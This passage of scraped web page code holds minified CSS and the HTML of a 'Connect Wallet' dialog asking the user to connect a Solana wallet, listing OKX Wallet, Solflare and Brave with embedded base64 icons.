fade-in;cursor:auto;-webkit-box-align:center;align-items:center;-webkit-box-pack:center;justify-content:center;background-color:rgba(0,0,0,0.25);--tw-backdrop-blur:blur(4px);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}@-webkit-keyframes fade-in{0%{opacity:0.2}100%{opacity:1}}@keyframes fade-in{0%{opacity:0.2}100%{opacity:1}}.css-1pt1vl2{position:relative;display:flex;max-height:90vh;width:100%;max-width:28rem;flex-direction:column;overflow:hidden;border-radius:0.75rem;transition-property:height;transition-timing-function:cubic-bezier(0.4,0,0.2,1);transition-duration:500ms;--tw-bg-opacity:1;background-color:rgb(49 62 76);--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity))}@media (min-width:1024px){.css-1pt1vl2{max-height:576px}}.css-1km4atu{display:flex;-webkit-box-pack:justify;justify-content:space-between;padding:1.5rem 1.25rem;line-height:1}.css-16ceglb{font-weight:600}.css-df9rzr{margin-top:0.25rem;font-size:0.75rem;line-height:1rem;color:rgba(255,255,255,0.5)}.css-1o7lixs{position:absolute;right:1rem;top:1rem}.css-1ng0ss1{border-top-width:1px;border-color:rgba(255,255,255,0.1)}@media (min-width:1024px){}@media (min-width:1024px){}.css-k19fg7{object-fit:contain}@media (min-width:1024px){}@-webkit-keyframes fade-out{0%{opacity:1}100%{opacity:0}}@keyframes fade-out{0%{opacity:1}100%{opacity:0}}.css-1rigx3j{margin-top:1rem;display:grid;grid-template-columns:repeat(2,minmax(0px,1fr));gap:0.5rem;padding-bottom:1rem}.css-19rqjni{display:flex;cursor:pointer;-webkit-box-align:center;align-items:center;border-radius:0.5rem;border-width:1px;border-color:rgba(255,255,255,0.1);padding:1rem 1.25rem;transition-property:all;transition-timing-function:cubic-bezier(0.4,0,0.2,1);transition-duration:150ms}.css-19rqjni>:not([hidden])~:not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1.25rem*var(--tw-space-x-reverse));margin-left:calc(1.25rem*calc(1 - var(--tw-space-x-reverse)))}.css-19rqjni:hover{background-color:rgba(255,255,255,0.1);--tw-shadow:0 25px 50px -12px rgb(0 0 0/0.25);--tw-shadow-colored:0 25px 50px -12px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0#0000),var(--tw-ring-shadow,0 0#0000),var(--tw-shadow);--tw-backdrop-blur:blur(24px);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}.css-19rqjni:hover{background-color:rgba(255,255,255,0.1);--tw-shadow:0 25px 50px -12px rgb(0 0 0/0.25);--tw-shadow-colored:0 25px 50px -12px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0#0000),var(--tw-ring-shadow,0 0#0000),var(--tw-shadow)}.css-18g8lgp{overflow:hidden;text-overflow:ellipsis;font-size:0.75rem;line-height:1rem;font-weight:600}.css-1xwazdk{position:relative;height:100%;overflow-y:auto;padding:0.75rem 1.25rem 2rem}.css-wlsnmg{overflow:hidden;transition-property:all;transition-timing-function:cubic-bezier(0.4,0,0.2,1);transition-duration:200ms;animation:0.15s ease-in-out 0s 1 normal none running fade-in}@-webkit-keyframes fade-in{0%{opacity:0.2}100%{opacity:1}}@keyframes fade-in{0%{opacity:0.2}100%{opacity:1}}.css-czicsy{position:absolute;bottom:1.75rem;left:0px;z-index:50;display:block;height:5rem;width:100%;pointer-events:none;background-image:linear-gradient(to top,var(--tw-gradient-stops));--tw-gradient-from:rgb(49,62,76) var(--tw-gradient-from-position);--tw-gradient-to:transparent var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from),var(--tw-gradient-to)}</style><div id=\"__next\"><dialog role=\"dialog\" aria-modal=\"true\" class=\"css-1vx73dy\" open=\"\"><div class=\"css-1pt1vl2\"><div class=\"css-1km4atu\"><div><div class=\"css-16ceglb\"><span>Connect Wallet</span></div><div class=\"css-df9rzr\"><span>You need to connect a Solana wallet.</span></div></div><button class=\"css-1o7lixs\"><svg width=\"12\" height=\"12\" viewBox=\"0 0 20 21\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M2.0336 16.2126L8.2336 10.0126L2.0336 3.81263C1.7961 3.57903 1.66172 3.25951 1.66016 2.92669C1.65938 2.59309 1.79141 2.27357 2.02734 2.03763C2.26328 1.80247 2.5828 1.67045 2.9164 1.67201C3.25 1.67357 3.56874 1.80795 3.80234 2.04623L9.99994 8.24623L16.1999 2.04623C16.4335 1.80795 16.7523 1.67357 17.0859 1.67201C17.4187 1.67045 17.739 1.80248 17.9749 2.03763C18.2109 2.27357 18.3429 2.59309 18.3413 2.92669C18.3406 3.25951 18.2062 3.57903 17.9687 3.81263L11.7663 10.0126L17.9663 16.2126C18.2038 16.4462 18.3382 16.7658 18.3397 17.0986C18.3405 17.4322 18.2085 17.7517 17.9725 17.9876C17.7366 18.2228 17.4171 18.3548 17.0835 18.3533C16.7499 18.3517 16.4311 18.2173 16.1975 17.979L9.99994 11.779L3.79994 17.979C3.31088 18.4611 2.52494 18.4579 2.039 17.9736C1.55384 17.4884 1.54994 16.7025 2.03119 16.2126L2.0336 16.2126Z\" fill=\"currentColor\"></path></svg></button></div><div class=\"css-1ng0ss1\"></div><div class=\"hideScrollbar css-1xwazdk\" style=\"margin-bottom:0em\"><div class=\"css-wlsnmg\" style=\"height:auto\"><div><div translate=\"no\" class=\"css-1rigx3j\"><ul><li class=\"css-19rqjni\" data-provider=\"okx\"><div style=\"min-width:30px;min-height:30px\"><img width=\"30\" height=\"30\" src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAJDSURBVHgB7Zq9jtpAEMfHlhEgQLiioXEkoAGECwoKxMcTRHmC5E3IoyRPkPAEkI7unJYmTgEFTYwA8a3NTKScLnCHN6c9r1e3P2llWQy7M/s1Gv1twCP0ej37dDq9x+Zut1t3t9vZjDEHIiSRSPg4ZpDL5fxkMvn1cDh8m0wmfugfO53OoFQq/crn8wxfY9EymQyrVCqMfHvScZx1p9ls3pFxXBy/bKlUipGPrVbLuQqAfsCliq3zl0H84zwtjQrOw4Mt1W63P5LvBm2d+Xz+YzqdgkqUy+WgWCy+Mc/nc282m4FqLBYL+3g8fjDxenq72WxANZbLJeA13zDX67UDioL5ybXwafMYu64Ltn3bdDweQ5R97fd7GyhBQMipx4POeEDHIu2LfDdBIGGz+hJ9CQ1ABjoA2egAZPM6AgiCAEQhsi/C4jHyPA/6/f5NG3Ks2+3CYDC4aTccDrn6ojG54MnEvG00GoVmWLIRNZ7wTCwDHYBsdACy0QHIhiuRETxlICWpMMhGZHmqS8qH6JLyGegAZKMDkI0uKf8X4SWlaZo+Pp1bRrwlJU8ZKLIvUjKh0WiQ3sRUbNVq9c5Ebew7KEo2m/1p4jJ4qAmDaqDQBzj5XyiAT4VCQezJigAU+IDU+z8vJFnGWeC+bKQV/5VZ71FV6L7PA3gg3tXrdQ+DgLhC+75Wq3no69P3MC0NFQpx2lL04Ql9gHK1bRDjsSBIvScBnDTk1WrlGIZBorIDEYJj+rhdgnQ67VmWRe0zlplXl81vcyEt0rSoYDUAAAAASUVORK5CYII=\" alt=\"OKX Wallet icon\" class=\"css-k19fg7\"></div><span class=\"css-18g8lgp\">OKX Wallet</span></li></ul><ul><li class=\"css-19rqjni\" data-provider=\"solflare\"><div style=\"min-width:30px;min-height:30px\"><img width=\"30\" height=\"30\" src=\"data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgNTAgNTAiIHdpZHRoPSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGxpbmVhckdyYWRpZW50IGlkPSJhIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiNmZmMxMGIiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNmYjNmMmUiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0iYiIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSI2LjQ3ODM1IiB4Mj0iMzQuOTEwNyIgeGxpbms6aHJlZj0iI2EiIHkxPSI3LjkyIiB5Mj0iMzMuNjU5MyIvPjxyYWRpYWxHcmFkaWVudCBpZD0iYyIgY3g9IjAiIGN5PSIwIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDQuOTkyMTg4MzIgMTIuMDYzODc5NjMgLTEyLjE4MTEzNjU1IDUuMDQwNzEwNzQgMjIuNTIwMiAyMC42MTgzKSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHI9IjEiIHhsaW5rOmhyZWY9IiNhIi8+PHBhdGggZD0ibTI1LjE3MDggNDcuOTEwNGMuNTI1IDAgLjk1MDcuNDIxLjk1MDcuOTQwM3MtLjQyNTcuOTQwMi0uOTUwNy45NDAyLS45NTA3LS40MjA5LS45NTA3LS45NDAyLjQyNTctLjk0MDMuOTUwNy0uOTQwM3ptLTEuMDMyOC00NC45MTU2NWMuNDY0Ni4wMzgzNi44Mzk4LjM5MDQuOTAyNy44NDY4MWwxLjEzMDcgOC4yMTU3NGMuMzc5OCAyLjcxNDMgMy42NTM1IDMuODkwNCA1LjY3NDMgMi4wNDU5bDExLjMyOTEtMTAuMzExNThjLjI3MzMtLjI0ODczLjY5ODktLjIzMTQ5Ljk1MDcuMDM4NTEuMjMwOS4yNDc3Mi4yMzc5LjYyNjk3LjAxNjEuODgyNzdsLTkuODc5MSAxMS4zOTU4Yy0xLjgxODcgMi4wOTQyLS40NzY4IDUuMzY0MyAyLjI5NTYgNS41OTc4bDguNzE2OC44NDAzYy40MzQxLjA0MTguNzUxNy40MjM0LjcwOTMuODUyNC0uMDM0OS4zNTM3LS4zMDc0LjYzOTUtLjY2MjguNjk0OWwtOS4xNTk0IDEuNDMwMmMtMi42NTkzLjM2MjUtMy44NjM2IDMuNTExNy0yLjEzMzkgNS41NTc2bDMuMjIgMy43OTYxYy4yNTk0LjMwNTguMjE4OC43NjE1LS4wOTA4IDEuMDE3OC0uMjYyMi4yMTcyLS42NDE5LjIyNTYtLjkxMzguMDIwM2wtMy45Njk0LTIuOTk3OGMtMi4xNDIxLTEuNjEwOS01LjIyOTctLjI0MTctNS40NTYxIDIuNDI0M2wtLjg3NDcgMTAuMzk3NmMtLjAzNjIuNDI5NS0uNDE3OC43NDg3LS44NTI1LjcxMy0uMzY5LS4wMzAzLS42NjcxLS4zMDk3LS43MTcxLS42NzIxbC0xLjM4NzEtMTAuMDQzN2MtLjM3MTctMi43MTQ0LTMuNjQ1NC0zLjg5MDQtNS42NzQzLTIuMDQ1OWwtMTIuMDUxOTUgMTAuOTc0Yy0uMjQ5NDcuMjI3MS0uNjM4MDkuMjExNC0uODY4LS4wMzUtLjIxMDk0LS4yMjYyLS4yMTczNS0uNTcyNC0uMDE0OTMtLjgwNmwxMC41MTgxOC0xMi4xMzg1YzEuODE4Ny0yLjA5NDIuNDg0OS01LjM2NDQtMi4yODc2LTUuNTk3OGwtOC43MTg3Mi0uODQwNWMtLjQzNDEzLS4wNDE4LS43NTE3Mi0uNDIzNS0uNzA5MzYtLjg1MjQuMDM0OTMtLjM1MzcuMzA3MzktLjYzOTQuNjYyNy0uNjk1bDkuMTUzMzgtMS40Mjk5YzIuNjU5NC0uMzYyNSAzLjg3MTgtMy41MTE3IDIuMTQyMS01LjU1NzZsLTIuMTkyLTIuNTg0MWMtLjMyMTctLjM3OTItLjI3MTMtLjk0NDMuMTEyNi0xLjI2MjEuMzI1My0uMjY5NC43OTYzLS4yNzk3IDEuMTMzNC0uMDI0OWwyLjY5MTggMi4wMzQ3YzIuMTQyMSAxLjYxMDkgNS4yMjk3LjI0MTcgNS40NTYxLTIuNDI0M2wuNzI0MS04LjU1OTk4Yy4wNDU3LS41NDA4LjUyNjUtLjk0MjU3IDEuMDczOS0uODk3Mzd6bS0yMy4xODczMyAyMC40Mzk2NWMuNTI1MDQgMCAuOTUwNjcuNDIxLjk1MDY3Ljk0MDNzLS40MjU2My45NDAzLS45NTA2Ny45NDAzYy0uNTI1MDQxIDAtLjk1MDY3LS40MjEtLjk1MDY3LS45NDAzcy40MjU2MjktLjk0MDMuOTUwNjctLjk0MDN6bTQ3LjY3OTczLS45NTQ3Yy41MjUgMCAuOTUwNy40MjEuOTUwNy45NDAzcy0uNDI1Ny45NDAyLS45NTA3Ljk0MDItLjk1MDctLjQyMDktLjk1MDctLjk0MDIuNDI1Ny0uOTQwMy45NTA3LS45NDAzem0tMjQuNjI5Ni0yMi40Nzk3Yy41MjUgMCAuOTUwNi40MjA5NzMuOTUwNi45NDAyNyAwIC41MTkzLS40MjU2Ljk0MDI3LS45NTA2Ljk0MDI3LS41MjUxIDAtLjk1MDctLjQyMDk3LS45NTA3LS45NDAyNyAwLS41MTkyOTcuNDI1Ni0uOTQwMjcuOTUwNy0uOTQwMjd6IiBmaWxsPSJ1cmwoI2IpIi8+PHBhdGggZD0ibTI0LjU3MSAzMi43NzkyYzQuOTU5NiAwIDguOTgwMi0zLjk3NjUgOC45ODAyLTguODgxOSAwLTQuOTA1My00LjAyMDYtOC44ODE5LTguOTgwMi04Ljg4MTlzLTguOTgwMiAzLjk3NjYtOC45ODAyIDguODgxOWMwIDQuOTA1NCA0LjAyMDYgOC44ODE5IDguOTgwMiA4Ljg4MTl6IiBmaWxsPSJ1cmwoI2MpIi8+PC9zdmc+\" alt=\"Solflare icon\" class=\"css-k19fg7\"></div><span class=\"css-18g8lgp\">Solflare</span></li></ul><ul><li class=\"css-19rqjni\" data-provider=\"brave\"><div style=\"min-width:30px;min-height:30px\"><img width=\"30\" height=\"30\" src=\"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTE4IiBoZWlnaHQ9IjEzNSIgdmlld0JveD0iMCAwIDExOCAxMzUiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMTEyLjI5NCAzMi4zMTgxTDExNS40NTQgMjQuNTYyOEMxMTUuNDU0IDI0LjU2MjggMTExLjQzMiAyMC4yNTQzIDEwNi41NDkgMTUuMzcxM0MxMDEuNjY1IDEwLjQ4ODQgOTEuMzI0MyAxMy4zNjA3IDkxLjMyNDMgMTMuMzYwN0w3OS41NDY5IDBINTguODY0NkgzOC4xODIzTDI2LjQwNDkgMTMuMzYwN0MyNi40MDQ5IDEzLjM2MDcgMTYuMDYzOCAxMC40ODg0IDExLjE4MDUgMTUuMzcxM0M2LjI5NzEzIDIwLjI1NDMgMi4yNzU1OCAyNC41NjI4IDIuMjc1NTggMjQuNTYyOEw1LjQzNTM3IDMyLjMxODFMMS40MTM4MiA0My44MDc1QzEuNDEzODIgNDMuODA3NSAxMy4yNDE1IDg4LjYwMzEgMTQuNjI3NSA5NC4wNzM1QzE3LjM1NjQgMTA0Ljg0NSAxOS4yMjM2IDEwOS4wMSAyNi45Nzk0IDExNC40NjdDMzQuNzM1MyAxMTkuOTI1IDQ4LjgxMDcgMTI5LjQwMyA1MS4xMDg3IDEzMC44MzlDNTMuNDA2OCAxMzIuMjc2IDU2LjI3OTMgMTM0LjcyMiA1OC44NjQ2IDEzNC43MjJDNjEuNDQ5OSAxMzQuNzIyIDY0LjMyMjQgMTMyLjI3NiA2Ni42MjA1IDEzMC44MzlDNjguOTE4NSAxMjkuNDAzIDgyLjk5MzkgMTE5LjkyNSA5MC43NDk4IDExNC40NjdDOTguNTA1NiAxMDkuMDEgMTAwLjM3MyAxMDQuODQ1IDEwMy4xMDIgOTQuMDczNUMxMDQuNDg3IDg4LjYwMzEgMTE2LjMxNSA0My44MDc1IDExNi4zMTUgNDMuODA3NUwxMTIuMjk0IDMyLjMxODFaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXIpIi8+CjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNNzMuNTE0NiAyNC4yNzU2Qzc1LjIzODIgMjQuMjc1NiA4OC4wMjEgMjEuODM0MSA4OC4wMjEgMjEuODM0MUM4OC4wMjEgMjEuODM0MSAxMDMuMTcgNDAuMTQ1MyAxMDMuMTcgNDQuMDU4OEMxMDMuMTcgNDcuMjk0NiAxMDEuODY3IDQ4LjU2MTEgMTAwLjMzMyA1MC4wNTI2QzEwMC4wMTEgNTAuMzY1MSA5OS42Nzk4IDUwLjY4NzQgOTkuMzQ4IDUxLjAzOThDOTcuNDMyIDUzLjA3NDIgODkuMDY0IDYxLjk1OTUgODcuOTg5NCA2My4xMDA0Qzg3Ljg3NjggNjMuMjIgODcuNzUxNSA2My4zNDYgODcuNjE4OCA2My40Nzk0Qzg2LjQ4NSA2NC42MTkzIDg0LjgxNTUgNjYuMjk3OCA4NS45OTM1IDY5LjA4NTVDODYuMDcyMyA2OS4yNzE5IDg2LjE1MzMgNjkuNDYxMyA4Ni4yMzU1IDY5LjY1MzVDODcuNTI3MSA3Mi42NzM5IDg5LjEyMTUgNzYuNDAyMyA4Ny4wOTIgODAuMTgwOEM4NC45MzMgODQuMTk5OCA4MS4yMzQ2IDg2Ljg4MjMgNzguODY0OCA4Ni40Mzg4Qzc2LjQ5NDkgODUuOTk1IDcwLjkyOTQgODMuMDg2NyA2OC44ODI3IDgxLjc1ODNDNjYuODM2IDgwLjQyOTggNjAuMzQ5MiA3NS4wODA0IDYwLjM0OTIgNzMuMDMzNkM2MC4zNDkyIDcxLjMyNjUgNjUuMDE0MyA2OC40ODY2IDY3LjI4MSA2Ny4xMDY4QzY3LjczMTggNjYuODMyNCA2OC4wODc3IDY2LjYxNTcgNjguMjkzMiA2Ni40NzcxQzY4LjUyNzIgNjYuMzE5NSA2OC45MTg2IDY2LjA3NjQgNjkuNDAwMiA2NS43NzcyQzcxLjQ2OTEgNjQuNDkxOSA3NS4yMDQ2IDYyLjE3MTIgNzUuMjk4NSA2MS4xNDIzQzc1LjQxNCA1OS44NzM2IDc1LjM3IDU5LjUwMTcgNzMuNzAyNSA1Ni4zNjc0QzczLjM0NzkgNTUuNzAwOSA3Mi45MzMgNTQuOTg3IDcyLjUwNDIgNTQuMjQ5MkM3MC45MTYzIDUxLjUxNzMgNjkuMTM4MyA0OC40NTgzIDY5LjUzMTkgNDYuMjY3MUM2OS45NzYyIDQzLjc5MzUgNzMuODUyMyA0Mi4zNzUzIDc3LjEzNTYgNDEuMTc0Qzc3LjU0NiA0MS4wMjM4IDc3Ljk0NzEgNDAuODc3MSA3OC4zMzEgNDAuNzMyMUM3OS4yODkzIDQwLjM3MDIgODAuNDkzNSAzOS45MTkyIDgxLjc1MTMgMzkuNDQ4MUM4NS4wMjkzIDM4LjIyMDMgODguNjcxNCAzNi44NTYyIDg5LjI3MiAzNi41NzkyQzkwLjEwMzYgMzYuMTk1OCA4OS44ODg3IDM1LjgzMDcgODcuMzcwMyAzNS41OTJDODcuMDM3MiAzNS41NjA0IDg2LjYyMjkgMzUuNTE2NCA4Ni4xNDc1IDM1LjQ2NTlDODMuMDMwMSAzNS4xMzQ2IDc3LjI4MDUgMzQuNTIzNyA3NC40ODUzIDM1LjMwMjhDNzMuOTM1NSAzNS40NTYgNzMuMzE5MiAzNS42MjI5IDcyLjY3MjkgMzUuNzk3OUM2OS41MzI1IDM2LjY0ODMgNjUuNjgzOSAzNy42OTA0IDY1LjMxNDEgMzguMjkxMkM2NS4yNDk0IDM4LjM5NjMgNjUuMTg1OSAzOC40ODY2IDY1LjEyNTggMzguNTcyQzY0Ljc3MjEgMzkuMDc0NyA2NC41NDE1IDM5LjQwMjUgNjQuOTMyOSA0MS41Mzg5QzY1LjA0OTQgNDIuMTc1MSA2NS4yODkxIDQzLjQyNjYgNjUuNTg1NCA0NC45NzM5QzY2LjQ1MjggNDkuNTA0MiA2Ny44MDYgNTYuNTcxIDY3Ljk3NjQgNTguMTU4NkM2OC4wMDAzIDU4LjM4MDggNjguMDI2NSA1OC41OTUxIDY4LjA1MTggNTguODAxNEM2OC4yNjg5IDYwLjU3MjYgNjguNDEzMyA2MS43NTEyIDY2LjM1NjMgNjIuMjIxNUM2Ni4xODUgNjIuMjYwNiA2Ni4wMDUxIDYyLjMwMTkgNjUuODE4MSA2Mi4zNDQ4QzYzLjQ5NyA2Mi44Nzc0IDYwLjA5NDIgNjMuNjU4MiA1OC44NjQ3IDYzLjY1ODJDNTcuNjM0NyA2My42NTgyIDU0LjIyOTMgNjIuODc2OCA1MS45MDg0IDYyLjM0NDJDNTEuNzIyNCA2Mi4zMDE1IDUxLjU0MzUgNjIuMjYwNCA1MS4zNzMxIDYyLjIyMTVDNDkuMzE1OSA2MS43NTEyIDQ5LjQ2MDMgNjAuNTcyNiA0OS42NzczIDU4LjgwMTRDNDkuNzAyNiA1OC41OTUxIDQ5LjcyODggNTguMzgwOCA0OS43NTI3IDU4LjE1ODZDNDkuOTIzNiA1Ni41Njg3IDUxLjI4MDIgNDkuNDg0NSA1Mi4xNDc2IDQ0Ljk1NUM1Mi40NDIyIDQzLjQxNjQgNTIuNjgwNCA0Mi4xNzI1IDUyLjc5NjUgNDEuNTM4OUM1My4xODc2IDM5LjQwMjcgNTIuOTU3IDM5LjA3NDggNTIuNjAzNSAzOC41NzIxQzUyLjU0MzUgMzguNDg2NyA1Mi40Nzk5IDM4LjM5NjMgNTIuNDE1MyAzOC4yOTEyQzUyLjA0NTYgMzcuNjkwNCA0OC4xOTcyIDM2LjY0ODQgNDUuMDU2OCAzNS43OThDNDQuNDEwMyAzNS42MjMgNDMuNzkzOCAzNS40NTYxIDQzLjI0MzggMzUuMzAyOEM0MC40NDg3IDM0LjUyMzcgMzQuNjk5NyAzNS4xMzQ2IDMxLjU4MjEgMzUuNDY1OUMzMS4xMDY1IDM1LjUxNjQgMzAuNjkyMSAzNS41NjA0IDMwLjM1ODggMzUuNTkyQzI3Ljg0MDcgMzUuODMwNyAyNy42MjU4IDM2LjE5NTggMjguNDU3MiAzNi41NzkyQzI5LjA1NzggMzYuODU2MSAzMi42OTgxIDM4LjIxOTYgMzUuOTc1NSAzOS40NDcxQzM3LjIzNDIgMzkuOTE4NiAzOC40Mzk0IDQwLjM3IDM5LjM5ODQgNDAuNzMyMUMzOS43ODI1IDQwLjg3NzIgNDAuMTgzOCA0MS4wMjQgNDAuNTk0MyA0MS4xNzQyQzQzLjg3NzQgNDIuMzc1NSA0Ny43NTMzIDQzLjc5MzcgNDguMTk3NSA0Ni4yNjcxQzQ4LjU5MSA0OC40NTggNDYuODEzNCA1MS41MTY0IDQ1LjIyNTggNTQuMjQ4QzQ0Ljc5NjggNTQuOTg2MiA0NC4zODE2IDU1LjcwMDUgNDQuMDI2OSA1Ni4zNjc0QzQyLjM1OTQgNTkuNTAxNyA0Mi4zMTUxIDU5Ljg3MzYgNDIuNDMwOSA2MS4xNDIzQzQyLjUyNDYgNjIuMTcxIDQ2LjI1ODggNjQuNDkxIDQ4LjMyNzggNjUuNzc2NUM0OC44MSA2Ni4wNzYgNDkuMjAxNyA2Ni4zMTk0IDQ5LjQzNTkgNjYuNDc3MUM0OS42NDEzIDY2LjYxNTYgNDkuOTk2OSA2Ni44MzIgNTAuNDQ3MyA2Ny4xMDYyQzUyLjcxMzYgNjguNDg1OCA1Ny4zNzk5IDcxLjMyNjMgNTcuMzc5OSA3My4wMzM2QzU3LjM3OTkgNzUuMDgwNCA1MC44OTM0IDgwLjQyOTggNDguODQ2NyA4MS43NTgzQzQ2LjggODMuMDg2NyA0MS4yMzQ1IDg1Ljk5NSAzOC44NjQ3IDg2LjQzODhDMzYuNDk0OCA4Ni44ODIzIDMyLjc5NjQgODQuMTk5OCAzMC42Mzc0IDgwLjE4MDhDMjguNjA4IDc2LjQwMjYgMzAuMjAyMSA3Mi42NzQ1IDMxLjQ5MzQgNjkuNjU0MkMzMS41NzU3IDY5LjQ2MTcgMzEuNjU2OCA2OS4yNzIxIDMxLjczNTYgNjkuMDg1NUMzMi45MTM4IDY2LjI5NzUgMzEuMjQzOSA2NC42MTg5IDMwLjExIDYzLjQ3OUMyOS45Nzc1IDYzLjM0NTcgMjkuODUyMiA2My4yMTk5IDI5LjczOTcgNjMuMTAwNEMyOS4xMTY3IDYyLjQzODcgMjYuMDQgNTkuMTcxOSAyMy4xOTE2IDU2LjE0NzVDMjEuMTI4OSA1My45NTczIDE5LjE4NTkgNTEuODk0MyAxOC4zODEyIDUxLjAzOThDMTguMDQ5NCA1MC42ODc1IDE3LjcxNzkgNTAuMzY1MiAxNy4zOTY2IDUwLjA1MjhDMTUuODYyNCA0OC41NjEyIDE0LjU1OTggNDcuMjk0NyAxNC41NTk4IDQ0LjA1ODhDMTQuNTU5OCA0MC4xNDUzIDI5LjcwODQgMjEuODM0MSAyOS43MDg0IDIxLjgzNDFDMjkuNzA4NCAyMS44MzQxIDQyLjQ5MTIgMjQuMjc1NiA0NC4yMTQ4IDI0LjI3NTZDNDUuNTkwMSAyNC4yNzU2IDQ4LjI0NTcgMjMuMzYxMSA1MS4wMTQxIDIyLjQwNzhDNTEuNzE1IDIyLjE2NjUgNTIuNDIzMiAyMS45MjI2IDUzLjExOTYgMjEuNjkwNUM1Ni41NjY3IDIwLjU0MTUgNTguODY0NyAyMC41MzMyIDU4Ljg2NDcgMjAuNTMzMkM1OC44NjQ3IDIwLjUzMzIgNjEuMTYyNyAyMC41NDE1IDY0LjYwOTggMjEuNjkwNUM2NS4zMDYyIDIxLjkyMjYgNjYuMDE0NCAyMi4xNjY1IDY2LjcxNTQgMjIuNDA3OEM2OS40ODM3IDIzLjM2MTEgNzIuMTM5NCAyNC4yNzU2IDczLjUxNDYgMjQuMjc1NlpNNzEuMzIwNiA4OS4wNDQyQzc0LjAyMjggOTAuNDM2NiA3NS45Mzk4IDkxLjQyNDQgNzYuNjY0NiA5MS44Nzc5Qzc3LjYwMjIgOTIuNDY1IDc3LjAzMDMgOTMuNTcxNyA3Ni4xNzYzIDk0LjE3NTVDNzUuMzIyIDk0Ljc3OTMgNjMuODQzIDEwMy42NjcgNjIuNzI5MSAxMDQuNjVDNjIuNTg2NSAxMDQuNzc2IDYyLjQzNTQgMTA0LjkxMiA2Mi4yNzc5IDEwNS4wNTRDNjEuMjA0NSAxMDYuMDIxIDU5LjgzNTMgMTA3LjI1NSA1OC44NjQ2IDEwNy4yNTVDNTcuODkzNiAxMDcuMjU1IDU2LjUyMzUgMTA2LjAyIDU1LjQ1IDEwNS4wNTJDNTUuMjkzIDEwNC45MTEgNTUuMTQyNCAxMDQuNzc1IDU1LjAwMDIgMTA0LjY1QzUzLjg4NiAxMDMuNjY3IDQyLjQwNzMgOTQuNzc5MyA0MS41NTMgOTQuMTc1NUM0MC42OTg3IDkzLjU3MTcgNDAuMTI3MSA5Mi40NjUgNDEuMDY0NyA5MS44Nzc5QzQxLjc5IDkxLjQyNDEgNDMuNzA4OCA5MC40MzU0IDQ2LjQxMzcgODkuMDQxN0M0Ny4yMDY2IDg4LjYzMzIgNDguMDY2OSA4OC4xODk5IDQ4Ljk4NDYgODcuNzE1QzUzLjAzMjIgODUuNjIwNSA1OC4wNzczIDgzLjgzOTcgNTguODY0NiA4My44Mzk3QzU5LjY1MiA4My44Mzk3IDY0LjY5NjggODUuNjIwNSA2OC43NDUgODcuNzE1QzY5LjY2NDUgODguMTkwOCA3MC41MjY0IDg4LjYzNSA3MS4zMjA2IDg5LjA0NDJaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTkxLjMyNDMgMTMuMzYwN0w3OS41NDY5IDBINTguODY0NkgzOC4xODIzTDI2LjQwNDkgMTMuMzYwN0MyNi40MDQ5IDEzLjM2MDcgMTYuMDYzNyAxMC40ODg0IDExLjE4MDQgMTUuMzcxM0MxMS4xODA0IDE1LjM3MTMgMjQuOTY4NiAxNC4xMjY3IDI5LjcwODMgMjEuODM0MUMyOS43MDgzIDIxLjgzNDEgNDIuNDkxMSAyNC4yNzU2IDQ0LjIxNDYgMjQuMjc1NkM0NS45MzgxIDI0LjI3NTYgNDkuNjcyNCAyMi44Mzk0IDUzLjExOTUgMjEuNjkwNUM1Ni41NjY1IDIwLjU0MTUgNTguODY0NiAyMC41MzMyIDU4Ljg2NDYgMjAuNTMzMkM1OC44NjQ2IDIwLjUzMzIgNjEuMTYyNiAyMC41NDE1IDY0LjYwOTYgMjEuNjkwNUM2OC4wNTY3IDIyLjgzOTQgNzEuNzkxIDI0LjI3NTYgNzMuNTE0NSAyNC4yNzU2Qzc1LjIzOCAyNC4yNzU2IDg4LjAyMDggMjEuODM0MSA4OC4wMjA4IDIxLjgzNDFDOTIuNzYwNSAxNC4xMjY3IDEwNi41NDkgMTUuMzcxMyAxMDYuNTQ5IDE1LjM3MTNDMTAxLjY2NSAxMC40